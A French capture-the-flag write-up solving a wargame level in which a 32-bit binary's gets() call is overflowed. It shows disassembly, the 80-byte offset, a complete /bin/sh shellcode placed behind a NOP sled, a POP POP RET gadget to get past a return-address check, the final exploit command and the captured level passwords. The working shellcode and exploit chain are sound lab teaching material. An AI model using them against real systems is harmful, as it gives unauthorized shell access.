On se connecte sur le level2, ou se trouve un **binaire** <code>level2</code>.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level2 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
> disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

En traduisant le programme (dans **source.c**) on se rend compte de l'utilisation de la fonction **gets** (vulnerable) mais aussi d' une restriction sur l'adresse de retour sur la stack:
<pre><code>if (0xb0000000 == (address & 0xb0000000))
</code></pre>
ou
```gdb
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
```

Nous allons donc faire un **buffer overflow** avec **shellcode**, et nous allons utliser un **POP POP RET** afin de bypasser la restriction.

On calcul l'**offset** qui va nous permettre de faire le **buffer overflow**:
```gdb
> gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > b *0x080484f2 # Adresse juste apres le gets
(gdb) > run
Starting program: /home/user/level2/level2
AAAAAAAAAAAAA

Breakpoint 1, 0x080484f2 in p ()
(gdb) > i f
 Stack level 0, frame at 0xbffff680:
 eip = 0x80484f2 in p; saved eip 0x804854a
 called by frame at 0xbffff690
 Arglist at 0xbffff678, args:
 Locals at 0xbffff678, Previous frame's sp is 0xbffff680
 Saved registers:
  ebp at 0xbffff678, eip at 0xbffff67c
(gdb) > p 0xbffff67c - 0xbffff62c
$1 = 80
```
> OFFSET : 80
>
> SHELLCODE: <code>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</code>
>
>POP POP RET: <code>0x080485c7   edi ebp ret</code>

Nous commençons par créer une varibale d'environnement avec notre **SHELLCODE** précédé d'une NOPSLIDE (assez grande pour mieux la repérer).
<pre><code>export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
</code></pre>

On cherche par la suite l'adresse de notre **SHELLCODE** afin de trouver une adresse d'un des NOP qu'on utlisera pour le buffer overflow.
```gdb
> gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > b * p
Breakpoint 1 at 0x80484d4
(gdb) > run
Starting program: /home/user/level2/level2

Breakpoint 1, 0x080484d4 in p ()
(gdb) > x/100xs environ
...
0xbffff866:    SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061۰\006̀Sh/ttyh/dev\211\343\061\311f\271\022'\260\005̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀"
(gdb) > x/100sx 0xbffff866
0xbffff866:     0x53    0x48    0x45    0x4c    0x4c    0x43    0x4f    0x44
0xbffff86e:     0x45    0x3d    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff876:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff87e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff886:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff88e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff896:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff89e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff8a6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff8ae:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff8b6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff8be:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff8c6:     0x90    0x90    0x90    0x90
```
On prend l'une des adresses qui ne contient que des **NOP**: <code>0xbffff8a6</code> et on génère notre commande pour le **buffer overflow** :
<pre><code>(python -c 'print "A" * 80 + "\xc7\x85\x04\x08" + "\xa6\xf8\xff\xbf"') | ./level2</code></pre>
> [OFFSET] = A * 80 [POP POP RET] = 0x080485c7 (little endian) [NOP ADDRESS] = Qui va mener au SHELLCODE
<pre><code>> cd ../level3 && cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
</code></pre>

For download :
<pre><code>scp -P4242 level2@192.168.1.78:level2 .</code></pre>
> Password : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


# Bonus

Ici un simple **ret** suffit, il suffit de prendre notre adresse de ret dans p :
<pre><code>0x0804853e
\x3e\x85\x04\x08 (little endian)
</code></pre>